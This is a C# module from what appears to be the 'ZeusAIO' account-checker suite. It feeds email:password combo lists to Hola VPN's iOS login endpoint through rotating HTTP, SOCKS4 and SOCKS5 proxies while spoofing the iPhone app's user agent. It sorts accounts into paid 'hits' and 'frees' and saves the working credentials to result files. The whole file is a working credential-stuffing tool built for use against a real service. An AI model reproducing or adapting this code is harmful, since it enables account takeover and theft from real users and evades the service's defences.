using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace HolaVpn
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "HolaVPN/2.12 (iPhone; iOS 12.4.7; Scale/2.00)";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;
                        string str = "email=" + s[0] + "&password=" + s[1];
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://client.hola.org/client_cgi/ios/login", str, "application/x-www-form-urlencoded").ToString();
                        bool flag7 = text2.Contains("token");

                        if (flag7)
                            {
                                string Plan = Check.Parse(text2, "membership\":" , "},\"");
                                if (Plan.Contains("trial\":false,\"active\":false"))
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - HOLAVPN] " + s[0] + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Holavpn_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - HOLAVPN] " + s[0] + ":" + s[1] + " | Plan: " + Plan, Color.Green);
                                }
                                Export.AsResult("/Holavpn_hits", s[0] + ":" + s[1] + " | Plan: " + Plan);
                                return false;
                            }
                        else
                        {
                            bool flag8 = text2.Contains("Precondition Failed");
                            if (flag8)
                            {
                                ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - HOLAVPN] " + s[0] + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Holavpn_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                            else if (text2.Contains("Unauthorized"))
                                {
                                    //bad
                                    break;
                                }
                            else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                        }
                    }
                    break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

